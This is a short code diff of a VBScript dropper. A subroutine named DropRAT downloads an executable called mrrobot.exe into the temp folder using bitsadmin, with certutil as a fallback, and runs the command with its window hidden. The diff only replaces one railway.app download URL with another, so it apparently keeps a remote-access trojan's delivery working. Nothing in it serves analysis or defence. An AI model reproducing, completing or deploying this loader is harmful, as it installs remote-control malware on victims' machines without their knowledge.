@@ -86,7 +86,7 @@ End Sub
 
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\mrrobot.exe"
-    Dim dl: dl = "https://sabdicerigchecker.up.railway.app/check"
+    Dim dl: dl = "https://67kid-production.up.railway.app/check"
     ' Try bitsadmin first
     sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     ' Fallback: certutil
